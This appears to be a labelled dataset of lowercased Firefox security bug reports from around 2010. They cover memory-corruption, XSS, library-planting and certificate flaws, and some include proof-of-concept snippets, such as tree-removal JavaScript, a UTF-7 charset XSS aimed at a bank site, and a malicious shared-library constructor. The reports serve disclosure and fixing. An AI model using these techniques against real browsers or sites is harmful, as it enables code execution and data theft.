xul cache lets html and xul share stylesheets can allow remote webpages to break browser ui this came up as a songbird issue i am marking it as security sensitive since there seems to be the possibility of abuse by remote webpages stylesheets loaded from chrome land in xul cache subsequent requests get a cached copy usually this is not a problem however if an html page requests a stylesheet this stylesheet seems to be converted before it is put into xul cache e.g all attribute names are lowercased if a xul document tries to use that stylesheet later it gets the version with lowercased attributes consequently the selectors no longer match correctly here is an example three files that need to be put into a chrome location test.html link rel stylesheet href test.css type text/css iframe src test.xul iframe test.css label color red label someattr color green test.xul xml-stylesheet href test.css type text/css page xmlns label someattr true value this should be green page if test.html is opened with xul cache disabled you will see green text with xul cache enabled the text will be red because the selectors no longer apply correctly in the xul document this issue can also be triggered by remote webpages if you used bookmarks ui already restart your browser then open the testcase it will load a stylesheet used by firefox bookmarks ui now click the star symbol in location bar to bookmark the current page click again to edit the bookmark try changing the folder and note that the icon in the menulist element does n't change this icon is added by css styles dependent on a mixed-case attribute name which does n't work if the stylesheet was previously loaded by an html page reproduced in firefox 3.5.6 and 3.6b5 the issue does n't occur in minefield it does n't seem to convert attribute names in stylesheets to lowercase	11
nstreecontentview dangling pointer vulnerability zdi-can-633 zdi-can-633 mozilla firefox nstreecontentview dangling pointer vulnerability abstract tippingpoint has identified a vulnerability affecting the following products mozilla firefox 3.5.x vulnerability details this vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of mozilla firefox user interaction is required in that the victim must visit a malicious website or be coerced into opening a malicious document the specific flaw exists within the way that mozilla s firefox parses xul files while appending a particular tag to a treechildren container the application will create more than one reference to a particular element without increasing its reference count upon removal of one of the elements the refcount will be decreased causing the application to free the memory associated with the object due to the rogue reference occurring the next time the application attempts to reference that container the application will access memory that has been freed which can lead to code execution under the context of the application version s tested mozilla firefox 3.5.6 platform s tested windows xp sp3 the vulnerability occurs due to the application incorrectly creating more than one option element inside an optgroup element within a treechildren container the xml used to describe this vulnerability is shown below to reproduce the issue one will need to manipulate this document via javascript when serializing an optgroup a new row is created.this vulnerability was discovered by regenrecht	11
xhr cross site status leak from xhr.statustext user-agent mozilla/5.0 macintosh u intel mac os x 10.5 en-us rv:1.9.1.8 gecko/20100202 firefox/3.5.8 build identifier mozilla/5.0 macintosh u intel mac os x 10.5 en-us rv:1.9.1.8 gecko/20100202 firefox/3.5.8 content/base/src/nsxmlhttprequest.cpp getstatus checks for a leak of status information from denied cross-site requests but getstatustext does not	2
xslt sort remote code execution vulnerability zdi-can-747 reported to the security alias zdi-can-747 mozilla firefox xslt sort remote code execution vulnerability abstract tippingpoint has identified a vulnerability affecting the following products mozilla firefox 3.6.x vulnerability details this vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of mozilla firefox user interaction is required to exploit this vulnerability in that the target must visit a malicious page or render a malicious file the specific flaw exists within a particular xslt transformation when applied to an xml document if a large number of elements have this transformation applied to them the application will misallocate a buffer upon usage of this buffer the application will copy more data than allocated thus causing an overflow this can lead to code execution under the context of the application this bug is triggered via the xslt sort function and is implemented in the following code upon evaluating of an xml statement the application will execute the following code this code will count the number of sort keys and then add each key to a txnodesorter element content/xslt/src/xslt/txinstructions.cpp:646 this code will then add the specified key to the list of nodes to be sorted version s tested mozilla firefox 3.6 platform s tested windows xp sp3	11
paranoidfragmentsinks allow javascript urls in chrome documents the two ns x htmlparanoidfragmentsink classes are used by nsiscriptableunescapehtml to sanitize x html by stripping attributes and tags not on a built-in whitelist internally to firefox this is only used by the feed processor but it s fairly popular with add-on authors and recommended as a best-practice the sinks attempt to sanitize urls by calling checkloaduri disallow_inherit_principal but unfortunately when the target document is a chrome document as is common with add-ons this check allows any uri in particular malicious href javascript evil or iframe src data evil can slip through and create sg-critical bugs l967 and ditto content/xml/document/src/nsxmlfragmentcontentsink.cpp would it be ok to simply always pass a nsnullprincipal in instead this problem was recently published in a whitepaper referenced at cross context scripting with firefox roberto suggi liverani link ting_with_firefox.pdf mitre has apparently assigned this cve-2010-1585	9
bytes mapped to u+fffd in 8-bit encodings make the following byte/character disappear user-agent mozilla/5.0 macintosh u intel mac os x 10.6 en-us rv:1.9.3a5pre gecko/20100508 minefield/3.7a5pre build identifier mozilla/5.0 macintosh u intel mac os x 10.6 en-us rv:1.9.3a5pre gecko/20100508 minefield/3.7a5pre many 8-bit encodings contain undefined positions which are mapped to u+fffd in the last minefield for mac such bytes are correctly mapped to u+fffd but the immediately following byte disappears for example the sequence xd1 xd2 xd3 xd4 in windows-1253 should result in u+3a1 u+fffd u+3a3 u+3a4 i.e the string	9
security problem with sjow and fast native function since safecallguard sets cx fp to null when a fast native function is called via sjow cx fp is null and when newobject cx clasp null null is called js_getclassprototype uses cx globalobject as scope if cx fp is null thus if a code running on a chrome s context accesses a content object via sjow a content code can get an object from the chrome s scope and run arbitrary code with chrome privileges by using that object trunk and 1.9.2 are affected on older branches sjow creates scripted callers instead of using safecallguard firebug and dom inspector are exploitable	9
combining importscripts of webworker with e4x causes information disclosure user-agent mozilla/5.0 windows u windows nt 6.0 ja rv:1.9.2.3 gecko/20100401 firefox/3.6.3 net clr 3.5.30729 build identifier mozilla/5.0 windows u windows nt 6.0 ja rv:1.9.2.3 gecko/20100401 firefox/3.6.3 net clr 3.5.30729 importscripts method reads remote resources as a javascript even if that is not a javascript file and importscripts method sent cookies to remote server at requesting their resources additionally importscripts method can read html file as javascript source using e4x feature thus attacker can read the victim s protected html file using importscripts and e4x across the domain reproducible always steps to reproduce see demo page for details actual results attacker can read remote contents expected results importscripts should fail to read html as a javascript source like as script src html	9
suppress the script filename for cross-origin error events sa39925 see	6
nstreeselection dangling pointer remote code execution vulnerability zdi-can-755 zdi-can-755 mozilla firefox nstreeselection dangling pointer remote code execution vulnerability abstract tippingpoint has identified a vulnerability affecting the following products mozilla firefox 3.6.x vulnerability details this vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of mozilla firefox user interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file the specific flaw exists within the implementation of xul tree element s selection attribute there is an integer overflow when calculating the bounds of a new selection range when calling adjustselection on this manged range both ranges are deleted leaving a dangling reference a remote attacker can exploit this vulnerability to execute arbitrary code under the context of the browser view of xul tree element exposes selection attribute this in turn allows user to precisely choose set of tree s rows to be shown as selected the way class nstreeselection layout/xul/base/src/tree/src/nstreeselection.cpp is implemented is quite interesting with a linked list of nstreerange instances where nstreerange represents single continuous range of selected rows and possibly a pointer to the next range nstreeselection holds directly only one pointer to the first range mfirstrange what is also important to note whenever any nstreerange instance is deleted delete inside destructor is called recursively on the next linked instances as well imagine we have the following piece of javascript code 1 sel tree.treeboxobject.view.selection 2 sel.rangedselect 0 true 3 sel.adjustselection 1 1 at 1 we grab the reference to selection object at this moment mfirstrange is null no row is selected so there is no need for any range to keep track of then 2 we call method rangedselect from nstreeselection rangedselect print32 start astartindex aendindex astartindex aendindex print32 end astartindex aendindex aendindex astartindex nstreerange range new nstreerange this start end if range return ns_error_out_of_memory range invalidate if aaugment mfirstrange mfirstrange insert range else mfirstrange range that makes mfirstrange being set to range 0 2g or more precisely yet in ad hoc pseudo code mfirstrange min 0 max 2g prev null next null and at 3 we hit integer overflow that causes a lot of trouble from nstreeselection adjustselection print32 aindex print32 acount nstreerange newrange nsnull prbool selchanged pr_false nstreerange curr mfirstrange while curr if acount 0 inserting if aindex curr mmax else if aindex curr mmin else adjustment happen inside the range break apart the range and create two ranges add_new_range newrange this curr mmin aindex 1 add_new_range newrange this aindex acount curr mmax acount selchanged pr_true else curr curr mnext delete mfirstrange mfirstrange newrange as we are calling adjustselection 1 1 two add_new_range are executed this means that something like 0 0 insert 2 2g will be called notice that because of integer overflow lower bound 2 is above higher bound 2g void insert nstreerange arange if mmin arange mmax arange connect mprev this else if mnext mnext insert arange else arange connect this nsnull so now 2 2g connect mprev null 0 0 void connect nstreerange aprev nsnull nstreerange anext nsnull if aprev aprev mnext this else mselection mfirstrange this if anext anext mprev this mprev aprev mnext anext which results in mfirstrange min 2 max 2g prev null next min 0 max 0 prev mfirstrange next null but we can not forget about the epilogue of adjustselection delete mfirstrange mfirstrange newrange final result both ranges 2 2g 0 0 are deleted and mfirstrange points at deleted range 0 0 credit this vulnerability was discovered by regenrecht	11
same-origin checks incorrect on canvas we currently have a notion of a write-only canvas to not allow reading data after an image or other non-same-origin content has been rendered into it however that flag lives on the canvas and not the context the context can outlive the canvas we do the check here l3506 but only if we have a mcanvaselement which can become null if that element is gc d in that case as part of the destruction process we call setcanvaselement with nsnull and the context does n't keep a strong reference to the canvas the right fix seems to be to keep the element alive for the lifetime of the context you can then reattach it to the dom via ctx.canvas whereas once you orphan a context you ca n't ever attach it to a canvas the other potential fix is to move the origin-clean flag to the context itself the first is probably the right solution patch coming up	2
arbitrary code execution via browser s tab element that was dropped on the content area if a user drag a browser s tab element and drop it on the content area a content-registered drop event listener can access the tab element and its properties including privileged functions only drop event listeners can access privileged objects without the security check l455	9
nscssvalue array index integer overflow can lead to remote code execution via css font-face zdi-can-831 zdi-can-831 mozilla firefox css font-face remote code execution vulnerability abstract tippingpoint has identified a vulnerability affecting the following products mozilla firefox 3.6.x vulnerability details this vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of mozilla firefox user interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file the specific flaw exists within handling of references to external font resources a value is used as a 16 bit integer in an array allocation and later as 32 bit when iterating over and then populating these fields by creating enough references a remote attacker can exploit this vulnerability to execute arbitrary code under the context of the browser version s tested 00400000 004e0000 firefox deferred image path c program files\mozilla firefox\firefox.exe image name firefox.exe timestamp thu apr 01 10:38:42 2010 4bb4be02 checksum 000ea924 imagesize 000e0000 file version 1.9.2.3743 product version 3.6.3.0 platform s tested windows xp sp3 x86 7893 alloc 7892 nsrefptr nscssvalue array srcvals 7893 nscssvalue array create values.length overflow 7899 pruint32 i 7900 for i 0 i values.length i 7901 srcvals item i values i credit this vulnerability was discovered by j23	11
navigation away from a page with an active select dropdown menu can be used for url spoofing other evil user-agent opera/9.80 x11 linux x86_64 u en presto/2.6.30 version/10.60 build identifier mozilla/5.0 x11 u linux x86_64 en-us rv:1.9.2.3 gecko/20100423 ubuntu/10.04 lucid firefox/3.6.3 firefox shows the dropdown menu for select elements as an always-on-top chromeless window it also allows arbitrary html content to be rendered in the option elements within the select navigating away from a page with an active select menu does not remove the chromeless window containing the menu from view by opening another menu programatically using xul in my proof-of-concept page it is possible to make the select menu persist through mouse interactions with the browser by using absolute positioning/scrolling an attacker can essentially cover arbitrary portions of a user s display with whatever they want i think the correct fix here would probably be to automatically dismiss select menus when navigating away from pages reproducible always	11
nstreecontentview dangling pointer remote code execution vulnerability zdi-can-804 zdi-can-804 mozilla firefox nstreecontentview dangling pointer remote code execution vulnerability cvss 10 av n/ac l/au n/c c/i c/a c abstract tippingpoint has identified a vulnerability affecting the following products mozilla firefox 3.6.x vulnerability details this vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of mozilla firefox user interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file the specific flaw exists within the implementation of a particular element within the xul namespace due to a method for the element having the side effect of executing javascript an attacker can provide their own javascript code which can be used to remove an object out from underneath the element s child hierarchy this can force the application to make an invalid reference when traversing it s internal objects thus using an illegitimate pointer this can be leveraged by an attacker to execute arbitrary code under the context of the application version s tested mozilla/5.0 windows u windows nt 5.1 en-us rv:1.9.2.3 gecko/20100401 firefox/3.6.3 one of the arguments to nstreecontentview getcell is an nsitreecolumn interface this gives the function the side effect of being able to execute a method of this object that is provided by the site in this code the first point of the variable that can be controlled is located within childiterator init layout/xul/base/src/tree/src/nstreecontentview.cpp:1531 nsicontent nstreecontentview getcell nsicontent acontainer nsitreecolumn acol nscomptr nsiatom colatom print32 colindex acol getatom getter_addrefs colatom acol getindex colindex xxx traverse through cells try to find the cell by ref attribute or by cell index in a row ref attribute has higher priority nsicontent result nsnull print32 j 0 childiterator iter last for childiterator init acontainer iter last iter last iter nsicontent cell iter if cell tag nsgkatoms treecell if colatom cell attrvalueis knamespaceid_none nsgkatoms ref colatom ecasematters result cell break else if j colindex result cell j return result an example of a method that can be used to exploit the side effect in the previously function can be located within getcellvalue if an attacker destroys the row when getcell is called then childiterator init will access it as the unsafe type layout/xul/base/src/tree/src/nstreecontentview.cpp:471 ns_imethodimp nstreecontentview getcellvalue print32 arow nsitreecolumn acol nsastring retval retval.truncate ns_ensure_arg_pointer acol ns_precondition arow 0 arow print32 mrows.length bad row if arow 0 arow print32 mrows.length return ns_error_invalid_arg row row mrows arow nsicontent realrow nstreeutils getimmediatechild row mcontent nsgkatoms treerow if realrow nsicontent cell getcell realrow acol xxx if cell cell getattr knamespaceid_none nsgkatoms value retval return ns_ok at this point acontent has been destroyed layout/base/nschilditerator.cpp:48 nsresult childiterator init nsicontent acontent childiterator afirst childiterator alast initialize out parameters to be equal in case of failure afirst mcontent alast mcontent nsnull afirst mindex alast mindex 0 ns_precondition acontent nsnull no content if acontent return ns_error_null_pointer nsidocument doc acontent getownerdoc credit this vulnerability was discovered by regenrecht	11
tree object removal remote code execution vulnerability zdi-can-817 zdi-can-817 mozilla firefox tree object removal remote code execution vulnerability abstract tippingpoint has identified a vulnerability affecting the following products mozilla firefox 3.6.x vulnerability details this vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of mozilla firefox user interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file the specific flaw exists within the support for xul tree objects if a specific property of a tree object is set and the parent node attempts to remove the child the process can be made to access invalid memory this can be abused by an attacker to execute remote code under the context of the user running the browser version s tested mozilla firefox 3.6.2 platform s tested windows xp sp3 x86 window xmlns onload run tree treecols treechildren tree script type text/javascript cdata function run var tree document.getelementsbytagname tree 0 var view tree.treeboxobject.view view.selection isselected function i return false set tree t if t null tree.parentnode.removechild tree var body tree.treeboxobject.treebody body.parentnode.removechild body script credit this vulnerability was discovered by regenrecht	11
frameset integer overflow via new operator in nshtmlframesetelement parserowcol chris matasano.com reported the following integer overflow vulnerability to security frameset integer overflow in new operator on line 332 of nshtmlframesetelement.cpp a frameset tag looks like this frameset cols 20 80 when a call to setattribute occurs on the frameset element we reach the following function on line 332 of nshtmlframesetelement.cpp nsresult nshtmlframesetelement parserowcol const nsastring avalue print32 anumspecs nsframesetspec aspecs count the commas print32 commax spec.findchar scomma print32 count 1 while commax knotfound count commax spec.findchar scomma commax 1 nsframesetspec specs new nsframesetspec count nshtmlframesetelement parserowcol counts the number of commas in the tag and then allocates a heap buffer using that number with the new operator the size of the nsframesetspec structure is 8 bytes so we need 536870912 or more commas to trigger the integer overflow when this happens too small of an allocation occurs and the proceeding heap memory is overwritten in the for loop on line 347 here is the crash dump from windbg 0:000 r eax=ffffffff ebx=00000000 ecx=00000000 edx=0000002c esi=001f0004 edi=00000000 eip=5e560c97 esp=001ee984 ebp=001eea78 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246 xul nshtmlframesetelement parserowcol 5e560c97 8366fc00 and dword ptr esi-4 0 ds:0023:001f0000=00905a4d there is one mitigating factor as you will see when you push the button below the script requires such an enormous allocation of commas that ff will ask the user several times if the script should be allowed to continue or not exploiting this bug in a 32bit firefox process might be difficult as the commas take up most of the available heap memory but a 64bit process is a different story fixing this vulnerability is relatively straight forward define a max number of commas and check count within the while loop to see if it has reached that threshold if it has exit the while loop alternatively checking for integer overflow before the new operator is called is also suggested	11
cross-site information disclosure via modal calls user-agent mozilla/5.0 windows u windows nt 5.1 en-us applewebkit/533.4 khtml like gecko chrome/5.0.375.86 safari/533.4 build identifier this site 0x.lv/xss.php plain_xss shows a vulnerability that allows an attacker to access some objects it should n't eg the location object 1 setting the url of a frame to javascript lockexecution interestingobject 2 lockexecution can be alert or xhr.send or xml.open etc 3 the attacker then sets the frame s location to the target website 4 when the target page finishes loading the lockexecution function is unlocked and a new window is created leaking a reference to interestingobject to the page 5 interestingobject.tostring is called by firefox and its result is written in the hosting page reproducible always steps to reproduce 1 visit 0x.lv/xss.php plain_xss 2 google.com redirects to www.google.com poc 3 eaea.sirdarckcat.net is able to read window.location actual results eaea.sirdarckcat.net is able to read window.location expected results eaea.sirdarckcat.net should n't able to read window.location	2
browser wildcard certificate validation issue not yet certain if this is an nss issue or psm issue maybe both i m intentionally giving this bug a higher severity than it probably deserves given that cas trusted by mozilla wo n't issue such certs received an email today from richard moore rich kde.org text as follows this is an advance notification of an advisory my company will be releasing at some point in the future we aim to work with vendors to achieve simultaneous disclosure so any comments would be appreciated once i ve dug out the various security contacts for the browsers concerned we will notify them privately as well please treat this information as confidential for now westpoint security advisory title multiple browser wildcard cerficate validation weakness risk rating low author richard moore rich westpoint.ltd.uk test cases simon ward simon westpoint.ltd.uk date 14 july 2010 advisory id wp-10-0001 url cve not yet assigned details rfc 2818 covers the requirements for matching cns and subjectaltnames in order to establish valid ssl connections it first discusses cns that are for hostnames and the rules for wildcards in this case the next paragraph in the rfc then discusses cns that are ip addresses in some cases the uri is specified as an ip address rather than a hostname in this case the ipaddress subjectaltname must be present in the certificate and must exactly match the ip in the uri the intention of the rfc is clearly that you should not be able to use wildcards with ip addresses in order to avoid the ability to perform man-in-the-middle attacks unfortunately our testing showed that this rule is not adhered to by some browsers we created a certificate with the cn 168.3.48 this meets the various rules for wildcards in cns but should be treated as invalid since it is not a hostname we then observed the errors reported by browsers when connecting to an https server using this certificate run on ip address 192.168.3.48 we imported the test ca used to sign the certifcate in order to perform the test the results we saw were as follows ie6 regarded the ip address as matching the cn vulnerable ie7 regarded the ip address as matching the cn vulnerable firefox 3.6.6 regarded the ip address as matching the cn vulnerable chrome regarded the ip address as matching the cn vulnerable opera regarded the ip address did not match the cn not vulnerable mitigating factors obviously a good ca should refuse to issue a certificate with the cn as indicated however there only need be one ca to issue one in error for this issue to result in the user getting no warning at all and being vulnerable to mitm the rules for hostname matching mean that only the first octet of the ip address can contain a wildcard this means that you must be able to control a server that matches the remainder of the ip address of your target which reduces the risk of this attack being used dramatically impact if exploited then a mitm attack can be performed allowing the guarantees ssl provides to be circumvented timeline 14 july 2010 limited disclosure to browser developers	5
windows xp dwmapi.dll dll-load vulnerability fg-vd-10-022 haifei li of fortinet s fortiguard labs submitted the following advisory to security the video is too large to attach so if you need it contact me oob note the following vulnerability information is a part of the pending-released paper from the author regarding the dll-load attack research additional information poc reproduce video is attached as well we recommend you fix this issue as soon as possible since we are going the release our paper including all the details of this vulnerability in the near future if you have any concerns let us know we would like to work with you resolve this issue by haifei li of fortinet s fortiguard labs hfli fortinet.com 2 mozilla firefox on windows xp dwmapi.dll dll-load vulnerability confirmed affected conditions mozilla firefox 3.6.6 on windows xp sp3 description when opening a html file with firefox directly by double-clicking on the file for example firefox is the default web browser firefox will try to load a dll named dwmapi.dll in the system this dwmapi.dll is a system dll on windows editions after windows xp such as windows vista and windows 7 however on windows xp there is no such a dll thus if the attacker put a malicious dwmapi.dll at the same directory of the html file malicious code will be executed when opening the html file by firefox this dll-loading process is done by loadlibrary in “ xul.dll as the following codes text:10253717 push offset s_dwmapi_dll dwmapi.dll text:1025371c call edi loadlibraryw thus it follows the sso the following detailed search order also shows the point in the case that “ dwmapi.dll does not exist in the system “ c firefox is the cwd c program files\mozilla firefox\dwmapi.dll not found c windows\system32\dwmapi.dll not found c windows\system\dwmapi.dll not found c windows\dwmapi.dll not found c firefox\dwmapi.dll not found c program files\mozilla firefox\dwmapi.dll not found c windows\system32\dwmapi.dll not found c windows\dwmapi.dll not found c windows\system32\wbem\dwmapi.dll not found on the development side we could infer that in the developing/testing process of firefox the vendor used highly-version windows as their testing environment they did not realize that their loading-dll could be non-exist on other platforms this case suggests that vendor should test their product on all the platforms that their product could run on a middle course is that putting the system dll in the application directory when installing however this requires that if the system dll is updated by microsoft for security problems in future the 3rd party vendor should also update the dll with microsoft to ensure the safety of their product	2
heap overflow in text runs crash nstextframeutils transformtext wooshi gmail.com sent the following to the security alias firefox exploitable vulnerability discovery date may 24 2010 discovery by wushi of team509 systems affected this vulnerability affects the following software mozilla firefox 3.6.6 overview firefox contains a vulnerability this vulnerability may allow attackers to remotely execute arbitrary code on the affected system exploitation may occur as the result of using the affected webkit application to visit a website the privileges gained by a remote attacker depend on the software component being attacked i description unpack the ff4.rar and got the 1.html use mozilla firefox to open it i used 3.6.6 on windows xp sp3 firefox will crash the crash will like this de8.9f4 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=0012b600 ebx=00000000 ecx=00000001 edx=0012daa5 esi=0012b620 edi=00130000 eip=101aca7a esp=0012b17c ebp=04c79a6a iopl=0 nv up ei pl nz ac pe cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010217 xul nstextframeutils transformtext 101aca7a 8807 mov byte ptr edi al ds:0023:00130000=41 0:000 kv childebp retaddr args to child 0012b194 101545a0 04c761cc fffffffc 00000002 xul nstextframeutils transformtext fpo uses ebp 5,4,0 conv cdecl e builds\moz2_slave\win32_build\build\layout\generic\nstextframeutils.cpp 220 0012c74c 10137a0c 0012d7d8 0477b058 0012dab0 xul buildtextrunsscanner buildtextrunforframes fpo uses ebp 1,1380,4 conv thiscall e builds\moz2_slave\win32_build\build\layout\generic\nstextframethebes.cpp 1657 0012d770 6165696f 0000005d 00000000 00000000 xul buildtextrunsscanner flushframes fpo uses ebp 1,1031,3 conv thiscall e builds\moz2_slave\win32_build\build\layout\generic\nstextframethebes.cpp 1215 warning frame ip not in any known module following frames may be wrong 0012d778 00000000 00000000 00000000 00000000 check the source code you can find this line cause the crash if nowinwhitespace if isdiscardable ch flags askipchars skipchar nowinwhitespace inwhitespace else aoutput ch error is here askipchars keepchar notice the stack you can find alength set to it is a mistake check the xul buildtextrunsscanner buildtextrunforframes source code you can find the error is here nsicontent content f getcontent const nstextfragment frag content gettext print32 contentstart mappedflow mstartframe getcontentoffset print32 contentend mappedflow getcontentend print32 contentlength contentend contentstart error is here in the test case the contentend contentstart so made the mistake and firefox did n't check the number	11
utf-7 universal xss by overriding document charset using object type attribute user-agent mozilla/5.0 windows u windows nt 6.0 en-us applewebkit/533.4 khtml like gecko chrome/5.0.375.99 safari/533.4 build identifier mozilla/5.0 windows u windows nt 6.0 en-us rv:1.9.2.6 gecko/20100625 firefox/3.6.6 net clr 3.5.30729 in firefox the type attribute of an object tag can override the charset of a framed html document even if the document is included across origins the charset specified in the type attribute overrides any charset of the document that is specified using xml encoding utf-8 meta charset utf-8 or meta http-equiv content-type value text/html charset=utf-8 this allows an attacker to bypass server xss filtering of angle brackets and inject arbitrary javascript code encoded in utf-7 into web sites it works on web sites that do not specify a charset in the content-type header 416 out of the alexa top 1000 it does not work on web sites that specify a charset in the content-type header 584 out of the alexa top 1000 reproducible always steps to reproduce here s a proof of concept exploit using bankofthewest.com as an example object type text/html charset=utf-7 data object actual results bank of the west attempts to set the charset using a meta tag but firefox ignores it and parses the response document as utf-7 the exploit is successful expected results firefox should not let the type attribute of a cross-origin object tag influence the charset of the rendered object see also bug 356280 bug 406777 bug 408457 bug 530647 bug 414064	9
normalizedocument remote code execution vulnerability zdi-can-866 zdi-can-866 mozilla firefox normalizedocument remote code execution vulnerability cvss 10 av n/ac l/au n/c c/i c/a c abstract tippingpoint has identified a vulnerability affecting the following products mozilla firefox 3.6.x vulnerability details this vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of mozilla firefox user interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file the flaw exists within the normalizedocument function defined within nsdocument.cpp when handling children nodes the code does not account for a varying number of children during normalization an attacker can abuse this problem along with the fact that the code does not validate the child index is within bounds to access an invalid object and execute arbitrary code under the context of the browser from content/base/src/nsdocument.cpp nsdocument normalize print32 count mchildren.childcount for print32 i 0 i count i nscomptr nsidomnode node do_queryinterface mchildren.childat i if node node normalize return ns_ok there are two problems in the code above 1 number of root s children can change during normalization thus fetching mchildren.childcount at the very beginning is incorrect 2 mchildren.childat is not a fail-safe method i.e it does not check if index argument is within children array bounds attacker can create html document with some additional nodes after html body and then remove them during initial steps of normalization process this directly leads to arbitrary code execution credit this vulnerability was discovered by regenrecht	9
buffer overflow due to uniscribe failure on long text runs user-agent mozilla/5.0 windows u windows nt 6.1 en-us rv:1.9.2.8 gecko/20100722 firefox/3.6.8 build identifier mozilla/5.0 windows u windows nt 6.1 en-us rv:1.9.2.8 gecko/20100722 firefox/3.6.8 when giving document.write a massive message a buffer overflow occurs and writes data to the call stack eventually causing the eip to be manipulated by javascript reproducible always steps to reproduce 1 open a debugger i used debuggy 2 visit the web page 3 in the debugger check the call stack a couple of times actual results i found that 41414141 was written to the call stack meaning that after normal browser operations the eip becomes 41414141 and that obviously leads to code execution if you change the eip to point to your shellcode expected results the browser should have frozen or crashed this was only tested against windows 7 on an x86 single core processor results may vary	11
mac crash with fuzzed font in data url marc schoenefeld reported the following to security mozilla.org i confirmed that it crashed for me on firefox 3.6.8 but not on trunk i died before crash reporter came up but i saved the relevant portion of the apple crash report which i ll attach crash wrangler told marc that it was a double free issue but i ca n't tell if that s consistent with what i got sg crit until we know for sure hi my font fuzzer triggered the following on ffx 3.6.8/osx10.6 the testcase is attached as html file embedding the malformed font in a data url tag the crashwrangler wrapped said it is exploitable so i thought i better forward this summary from cw faulty glyph id:38 outline detected replacing with a space/null glyph in memory font kind fri jul 30 12:20:24 maeckes2.local firefox-bin 10483 error cgbitmapcontextinfocreate unable to allocate 10584 bytes for bitmap data objc 10483 freed id message autorelease sent to freed object exception=exc_bad_instruction signal=4 is_exploitable=yes instruction_disassembly instruction_address access_type access_address illegal instruction at probably a exploitable issue cheers marc	11
sjows create scope chains ending in outer objects a sjow around an outer window creates a scope function parented directly to the outer window s global object which is the outer window i do n't know if this is exploitable but it s definitely hitting us on bug 581539 because window.postmessage indirectly depends on the scope chain ending in an inner object	2
nspluginarray memory corruption user-agent mozilla/5.0 windows u windows nt 6.1 en-us applewebkit/534.3 khtml like gecko chrome/6.0.472.14 safari/534.3 build identifier mozilla/5.0 windows u windows nt 6.1 ru rv:1.9.2.8 gecko/20100722 firefox/3.6.8 looks like it s a use-after-free issue i think the testcase is self-explaining although it s quite weak it takes a lot of time to trigger the crash reproducible always also crashes 4.0b2	11
xss using sjow s scripted function 1.9.1 branch has a similar problem to bug 584180 on 1.9.1 sjow creates a scripted function that can be abused if a scripted function s parent is an outer window an array that is created in that function comes from a current inner window	9
possible unfixed nstreeselection dangling pointer issues from bug 571106 zdi-can-903 zdi just notified us that the researcher who reported zdi-10-131 mozilla firefox nstreeselection dangling pointer remote code execution vulnerability also known as bug 571106 has reported that the vulnerability is still an issue even though a patch was released need to make sure that the entirety of the researcher s original report has been fixed and not just what the poc may be showing i will follow-up with zdi to see if there is a better testcase for the issue since i accidentally submitted bug 571106 comment 0 with extra blank lines i will repaste the original report in the next comment	11
use after free nsbarprop reproduced on 4.0b5pre and 3.6.8 the repro contains this w open 1 1 1 o w.locationbar w.close s setinterval s o.visible 50	11
binary planting potential in nsmimeinfowin launchwithfile this code 142 needs to use an absolute path	2
insecure handling of ld_library_path by run-mozilla.sh user-agent mozilla/5.0 x11 linux x86_64 rv:2.0b5pre gecko/20100826 firefox/4.0b5pre build identifier mozilla/5.0 x11 linux x86_64 rv:2.0b5pre gecko/20100826 firefox/4.0b5pre quoting ld-linux 8 ld_library_path a colon-separated list of directories in which to search for elf libraries at execution-time similar to the path environment variable all empty entries in ld_library_path are treated like the current directory but an entirely empty ld_library_path is not treated like having in ld_library_path is pretty insecure as it may lead to running arbitrary code let s make a shared library cat lib.c include stdio.h void my_init void attribute constructor void my_init void printf my_init n gcc shared fpic lib.c o librt.so.1 bin/ls and firefox-bin both depend on librt.so.1 running with empty ld_library_path export ld_library_path ls lib.c librt.so.1 running with in ld_library_path export ld_library_path ls ls librt.so.1 no version information available required by ls my_init lib.c librt.so.1 as you can see standard bin/ls program loaded librt.so.1 from current directory only the second time run-mozilla.sh changes ld_library_path can add en empty entry to it if originally ld_library_path was empty as all empty entries are equivalent to we have a problem because firefox will load libraries from current directory while all other programs wo n't export ld_library_path ls lib.c librt.so.1 bin/firefox/firefox no-remote profilemanager home/grib/bin/firefox/firefox-bin librt.so.1 no version information available required by home/grib/bin/firefox/libxul.so home/grib/bin/firefox/firefox-bin librt.so.1 no version information available required by usr/lib/libgthread-2.0.so.0 home/grib/bin/firefox/firefox-bin librt.so.1 no version information available required by usr/lib/libasound.so.2 home/grib/bin/firefox/firefox-bin librt.so.1 no version information available required by lib/libdbus-1.so.3 my_init home/grib/bin/firefox/firefox-bin relocation error home/grib/bin/firefox/libxul.so symbol clock_gettime version glibc_2.2.5 not defined in file librt.so.1 with link time reference here s a run with d option so that run-mozilla.sh dumps its variables bin/firefox/firefox g no-remote profilemanager home/grib/bin/firefox/run-mozilla.sh g home/grib/bin/firefox/firefox-bin no-remote profilemanager mozilla_five_home=/home/grib/bin/firefox ld_library_path=/home/grib/bin/firefox home/grib/bin/firefox/plugins home/grib/bin/firefox display=:0.0 dyld_library_path=/home/grib/bin/firefox home/grib/bin/firefox library_path=/home/grib/bin/firefox home/grib/bin/firefox/components home/grib/bin/firefox shlib_path=/home/grib/bin/firefox home/grib/bin/firefox libpath=/home/grib/bin/firefox home/grib/bin/firefox addon_path=/home/grib/bin/firefox moz_program=/home/grib/bin/firefox/firefox-bin moz_toolkit moz_debug=1 moz_debugger moz_debugger_args usr/bin/ddd gdb args home/grib/bin/firefox/firefox-bin no-remote profilemanager the vulnerability is that someone may trick the user to download a malicious library the user might save it into his home and after that start firefox from home the fix is simple replace var var by var var expressions in run-mozilla.sh the difference is that the first expression expands to nothing only if var is unset but the second expands to nothing if var is unset or var is empty reproducible always	2
